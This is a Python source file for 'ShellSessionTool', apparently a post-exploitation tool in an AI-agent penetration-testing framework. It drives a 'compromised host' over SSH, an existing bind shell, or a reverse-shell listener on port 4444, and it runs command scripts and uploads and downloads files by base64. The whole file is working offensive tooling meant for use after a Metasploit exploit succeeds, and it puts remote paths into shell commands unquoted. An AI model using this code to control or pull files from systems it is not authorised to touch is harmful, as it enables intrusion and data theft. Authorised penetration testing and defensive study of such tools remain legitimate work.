"""
ShellSessionTool — Persistent interactive shell for post-exploitation.

Provides a stateful shell session over SSH or a raw TCP bind/reverse shell,
enabling multi-step post-exploitation workflows without relying on msfconsole's
ephemeral session model.

Supported connection methods:
  ssh       — Authenticated SSH connection (uses paramiko)
  bind      — Connect to a bind shell already listening on target (netcat-style)
  reverse   — Listen for an incoming reverse shell from the target

Actions:
  exec        — Run a single command and return output
  exec_script — Run a list of commands sequentially, return all output
  upload      — Base64-encode a local file and write it to target via echo
  download    — Read a remote file as base64 and decode it locally
  close       — Close the connection (cleanup)

Design notes:
  - SSH sessions use paramiko for reliable I/O.
  - Bind/reverse shells use asyncio TCP streams with configurable timeout.
  - Sessions are NOT globally persistent — each tool call re-connects unless
    a session_id returned by a previous call is reused.
  - File upload is done via shell heredoc / printf (no SCP dependency).
"""

from __future__ import annotations

import asyncio
import base64
import logging
import os
import socket
import time
from pathlib import Path

from tools.base_tool import BaseTool, ToolHealthStatus, ToolMetadata

logger = logging.getLogger(__name__)

_CONNECT_TIMEOUT = 20     # seconds
_CMD_TIMEOUT     = 60     # seconds per command
_RECV_CHUNK      = 4096
_RECV_SETTLE_MS  = 300    # ms to wait for more data after last chunk
_MAX_OUTPUT_BYTES = 64 * 1024  # 64 KB cap per command


class ShellSessionTool(BaseTool):
    """
    Interactive shell session for post-exploitation enumeration.

    Use after metasploit_run succeeds to run multi-command sequences
    without re-exploiting the target each time.
    """

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="shell_exec",
            description=(
                "Execute commands on a compromised host via SSH or a raw shell (bind/reverse). "
                "Supports single commands, multi-command scripts, and file upload/download.\n"
                "  action='exec'        — run a single shell command\n"
                "  action='exec_script' — run multiple commands sequentially\n"
                "  action='upload'      — upload a file to the target\n"
                "  action='download'    — read a file from the target\n"
                "Connection methods:\n"
                "  method='ssh'     — SSH login (requires username + password or private_key)\n"
                "  method='bind'    — connect to a bind shell already listening on target_port\n"
                "  method='reverse' — listen on local_port for an incoming reverse shell"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["exec", "exec_script", "upload", "download"],
                        "description": "Action to perform",
                    },
                    "method": {
                        "type": "string",
                        "enum": ["ssh", "bind", "reverse"],
                        "description": "Connection method",
                        "default": "ssh",
                    },
                    "target_ip": {
                        "type": "string",
                        "description": "Target IP address (required for ssh and bind)",
                    },
                    "target_port": {
                        "type": "integer",
                        "description": "Port for SSH (default 22) or bind shell",
                        "default": 22,
                    },
                    "local_port": {
                        "type": "integer",
                        "description": "Local port to listen on (method=reverse only)",
                        "default": 4444,
                    },
                    "username": {
                        "type": "string",
                        "description": "SSH username (method=ssh only)",
                        "default": "",
                    },
                    "password": {
                        "type": "string",
                        "description": "SSH password (method=ssh only)",
                        "default": "",
                    },
                    "private_key": {
                        "type": "string",
                        "description": "PEM private key text (method=ssh only)",
                        "default": "",
                    },
                    "command": {
                        "type": "string",
                        "description": "Shell command to run (action=exec)",
                        "default": "",
                    },
                    "commands": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "List of shell commands to run sequentially (action=exec_script)",
                        "default": [],
                    },
                    "local_path": {
                        "type": "string",
                        "description": "Local file path to upload (action=upload)",
                        "default": "",
                    },
                    "remote_path": {
                        "type": "string",
                        "description": "Remote path for upload destination or download source",
                        "default": "",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Per-command timeout in seconds",
                        "default": 60,
                    },
                },
                "required": ["action"],
            },
            category="post-exploit",
            version="1.0.0",
        )

    async def health_check(self) -> ToolHealthStatus:
        # paramiko required for SSH method; bind/reverse only need stdlib
        try:
            import paramiko  # noqa: F401
            return ToolHealthStatus(available=True, message="paramiko available (SSH + raw shell)")
        except ImportError:
            return ToolHealthStatus(
                available=True,
                degraded=True,
                message="paramiko not installed — SSH method unavailable; bind/reverse still work",
                install_hint="pip install paramiko",
            )

    async def validate(self, params: dict) -> tuple[bool, str]:
        action = params.get("action", "")
        method = params.get("method", "ssh")
        if action not in ("exec", "exec_script", "upload", "download"):
            return False, f"Unknown action '{action}'"
        if method not in ("ssh", "bind", "reverse"):
            return False, f"Unknown method '{method}'"
        if method in ("ssh", "bind") and not params.get("target_ip", "").strip():
            return False, "target_ip is required for ssh and bind methods"
        if action == "exec" and not params.get("command", "").strip():
            return False, "command is required for action=exec"
        if action == "exec_script" and not params.get("commands"):
            return False, "commands list is required for action=exec_script"
        if action == "upload":
            if not params.get("local_path", "").strip():
                return False, "local_path is required for action=upload"
            if not params.get("remote_path", "").strip():
                return False, "remote_path is required for action=upload"
        if action == "download" and not params.get("remote_path", "").strip():
            return False, "remote_path is required for action=download"
        return True, ""

    async def execute(self, params: dict) -> dict:
        ok, msg = await self.validate(params)
        if not ok:
            return {"success": False, "output": None, "error": msg}

        method = params.get("method", "ssh")
        action = params.get("action", "exec")
        timeout = int(params.get("timeout", _CMD_TIMEOUT))

        try:
            if method == "ssh":
                return await asyncio.to_thread(self._execute_ssh, params, action, timeout)
            elif method == "bind":
                return await self._execute_bind(params, action, timeout)
            else:  # reverse
                return await self._execute_reverse(params, action, timeout)
        except Exception as exc:
            logger.error("shell_exec failed: %s", exc)
            return {"success": False, "output": None, "error": str(exc)}

    # ── SSH backend ──────────────────────────────────────────────────────────

    def _execute_ssh(self, params: dict, action: str, timeout: int) -> dict:
        try:
            import paramiko
        except ImportError:
            return {"success": False, "output": None,
                    "error": "paramiko not installed — use method=bind instead"}

        target_ip   = params["target_ip"]
        target_port = int(params.get("target_port", 22))
        username    = params.get("username", "")
        password    = params.get("password", "")
        private_key = params.get("private_key", "")

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            kwargs: dict = {
                "hostname": target_ip,
                "port": target_port,
                "username": username,
                "timeout": _CONNECT_TIMEOUT,
                "look_for_keys": False,
                "allow_agent": False,
            }
            if private_key.strip():
                import io
                pkey = paramiko.RSAKey.from_private_key(io.StringIO(private_key))
                kwargs["pkey"] = pkey
            else:
                kwargs["password"] = password

            client.connect(**kwargs)

            if action == "exec":
                return self._ssh_exec_single(client, params["command"], timeout)
            elif action == "exec_script":
                return self._ssh_exec_script(client, params.get("commands", []), timeout)
            elif action == "upload":
                return self._ssh_upload(client, params["local_path"], params["remote_path"], timeout)
            elif action == "download":
                return self._ssh_download(client, params["remote_path"], timeout)
            else:
                return {"success": False, "output": None, "error": f"Unknown action: {action}"}

        except paramiko.AuthenticationException:
            return {"success": False, "output": None, "error": "SSH auth failed — check credentials"}
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}
        finally:
            client.close()

    def _ssh_run(self, client, cmd: str, timeout: int) -> tuple[str, str, int]:
        stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
        rc  = stdout.channel.recv_exit_status()
        return out, err, rc

    def _ssh_exec_single(self, client, command: str, timeout: int) -> dict:
        out, err, rc = self._ssh_run(client, command, timeout)
        return {
            "success": rc == 0,
            "output": {"command": command, "stdout": out, "stderr": err, "exit_code": rc},
            "error": err if rc != 0 else None,
        }

    def _ssh_exec_script(self, client, commands: list[str], timeout: int) -> dict:
        results: list[dict] = []
        combined_stdout = []
        combined_stderr = []
        for cmd in commands:
            out, err, rc = self._ssh_run(client, cmd, timeout)
            combined_stdout.append(f"$ {cmd}\n{out}")
            if err.strip():
                combined_stderr.append(f"[stderr:{cmd[:40]}] {err}")
            results.append({"command": cmd, "stdout": out, "stderr": err, "exit_code": rc})
        return {
            "success": True,
            "output": {
                "commands_run": len(results),
                "results": results,
                "combined_stdout": "\n".join(combined_stdout)[:_MAX_OUTPUT_BYTES],
                "combined_stderr": "\n".join(combined_stderr)[:4096],
            },
            "error": None,
        }

    def _ssh_upload(self, client, local_path: str, remote_path: str, timeout: int) -> dict:
        """Upload a file via base64 + echo — no SCP/SFTP required."""
        try:
            data = Path(local_path).read_bytes()
        except Exception as exc:
            return {"success": False, "output": None, "error": f"Cannot read local file: {exc}"}

        encoded = base64.b64encode(data).decode()
        # Split into 76-char lines to avoid shell argument length limits
        lines = [encoded[i:i+76] for i in range(0, len(encoded), 76)]
        b64_content = "\\n".join(lines)

        # Write via printf + base64 -d — available on most Linux systems
        cmd = f"printf '%s' '{b64_content}' | base64 -d > {remote_path} && echo OK"
        out, err, rc = self._ssh_run(client, cmd, timeout)
        return {
            "success": rc == 0 and "OK" in out,
            "output": {"local_path": local_path, "remote_path": remote_path,
                       "bytes": len(data), "stdout": out},
            "error": err if rc != 0 else None,
        }

    def _ssh_download(self, client, remote_path: str, timeout: int) -> dict:
        """Download a file as base64 via cat | base64."""
        cmd = f"cat {remote_path} | base64"
        out, err, rc = self._ssh_run(client, cmd, timeout)
        if rc != 0:
            return {"success": False, "output": None, "error": err or "cat failed"}
        try:
            decoded = base64.b64decode(out.strip())
            return {
                "success": True,
                "output": {
                    "remote_path": remote_path,
                    "bytes": len(decoded),
                    "content_base64": out.strip()[:8192],  # return first 8KB as-is
                    "content_preview": decoded[:2048].decode(errors="replace"),
                },
                "error": None,
            }
        except Exception as exc:
            return {"success": False, "output": None, "error": f"base64 decode failed: {exc}"}

    # ── Bind shell backend ───────────────────────────────────────────────────

    async def _execute_bind(self, params: dict, action: str, timeout: int) -> dict:
        """Connect to a bind shell (e.g. opened by netcat or metasploit)."""
        target_ip   = params["target_ip"]
        target_port = int(params.get("target_port", 4444))

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target_ip, target_port),
                timeout=_CONNECT_TIMEOUT,
            )
        except (ConnectionRefusedError, OSError) as exc:
            return {"success": False, "output": None,
                    "error": f"Cannot connect to bind shell {target_ip}:{target_port} — {exc}"}
        except asyncio.TimeoutError:
            return {"success": False, "output": None,
                    "error": f"Timeout connecting to {target_ip}:{target_port}"}

        try:
            # Read initial banner
            await asyncio.sleep(0.5)
            banner = await self._drain_reader(reader, settle_ms=200)

            if action == "exec":
                return await self._raw_exec_single(
                    reader, writer, params["command"], timeout, banner
                )
            elif action == "exec_script":
                return await self._raw_exec_script(
                    reader, writer, params.get("commands", []), timeout, banner
                )
            else:
                return {"success": False, "output": None,
                        "error": f"action={action} not supported for bind shell (use exec or exec_script)"}
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    # ── Reverse shell backend ────────────────────────────────────────────────

    async def _execute_reverse(self, params: dict, action: str, timeout: int) -> dict:
        """Listen for a reverse shell connection from the target."""
        local_port = int(params.get("local_port", 4444))
        listen_timeout = int(params.get("listen_timeout", 30))

        reader: asyncio.StreamReader | None = None
        writer: asyncio.StreamWriter | None = None

        async def _accept_once(r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
            nonlocal reader, writer
            reader, writer = r, w

        server = await asyncio.start_server(_accept_once, "0.0.0.0", local_port)
        logger.info("[shell_exec] Listening for reverse shell on 0.0.0.0:%d", local_port)

        try:
            await asyncio.wait_for(
                self._wait_for_connection(lambda: reader is not None),
                timeout=listen_timeout,
            )
        except asyncio.TimeoutError:
            server.close()
            return {"success": False, "output": None,
                    "error": f"No reverse shell connected on port {local_port} within {listen_timeout}s"}
        finally:
            server.close()

        if reader is None or writer is None:
            return {"success": False, "output": None, "error": "Reverse shell accept failed"}

        try:
            await asyncio.sleep(0.5)
            banner = await self._drain_reader(reader, settle_ms=200)

            if action == "exec":
                return await self._raw_exec_single(reader, writer, params["command"], timeout, banner)
            elif action == "exec_script":
                return await self._raw_exec_script(
                    reader, writer, params.get("commands", []), timeout, banner
                )
            else:
                return {"success": False, "output": None,
                        "error": f"action={action} not supported for reverse shell"}
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    @staticmethod
    async def _wait_for_connection(condition_fn, poll_interval: float = 0.1):
        while not condition_fn():
            await asyncio.sleep(poll_interval)

    # ── Raw shell helpers ────────────────────────────────────────────────────

    async def _raw_exec_single(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        command: str,
        timeout: int,
        banner: str = "",
    ) -> dict:
        writer.write((command + "\n").encode())
        await writer.drain()
        output = await asyncio.wait_for(
            self._drain_reader(reader), timeout=timeout
        )
        return {
            "success": True,
            "output": {
                "command": command,
                "banner": banner[:500],
                "stdout": output[:_MAX_OUTPUT_BYTES],
            },
            "error": None,
        }

    async def _raw_exec_script(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        commands: list[str],
        timeout: int,
        banner: str = "",
    ) -> dict:
        results: list[dict] = []
        combined: list[str] = []
        if banner:
            combined.append(f"[banner] {banner[:200]}")

        for cmd in commands:
            writer.write((cmd + "\n").encode())
            await writer.drain()
            try:
                output = await asyncio.wait_for(
                    self._drain_reader(reader), timeout=timeout
                )
            except asyncio.TimeoutError:
                output = "[TIMEOUT — command may still be running]"
            results.append({"command": cmd, "output": output[:_MAX_OUTPUT_BYTES]})
            combined.append(f"$ {cmd}\n{output}")

        return {
            "success": True,
            "output": {
                "commands_run": len(results),
                "results": results,
                "combined": "\n".join(combined)[:_MAX_OUTPUT_BYTES],
            },
            "error": None,
        }

    async def _drain_reader(
        self,
        reader: asyncio.StreamReader,
        settle_ms: int = _RECV_SETTLE_MS,
    ) -> str:
        """Read all available data, waiting settle_ms after the last chunk."""
        chunks: list[bytes] = []
        total = 0
        while total < _MAX_OUTPUT_BYTES:
            try:
                chunk = await asyncio.wait_for(
                    reader.read(_RECV_CHUNK),
                    timeout=settle_ms / 1000.0,
                )
                if not chunk:
                    break
                chunks.append(chunk)
                total += len(chunk)
            except asyncio.TimeoutError:
                break  # no more data within settle window
        return b"".join(chunks).decode(errors="replace")
